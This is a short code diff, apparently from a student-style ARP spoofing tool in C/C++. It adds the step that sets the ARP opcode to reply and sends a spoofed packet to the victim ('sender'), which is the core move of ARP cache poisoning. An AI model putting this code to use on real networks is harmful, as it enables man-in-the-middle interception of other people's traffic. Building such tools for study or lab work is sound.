@@ -63,6 +63,10 @@ int main(int argc, char *argv[])
 
     sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
     receivePkt(handle, header, a2s);
+
+    // send spoofed packet to sender
+    a2s.setArpOpcode(ARPOP_REPLY);
+    sendPkt(handle, a2s.pkt, sizeof(a2s.pkt));
 }
 
 void getAttackerInfo(u_char* attackerIP, u_char* attackerMAC)
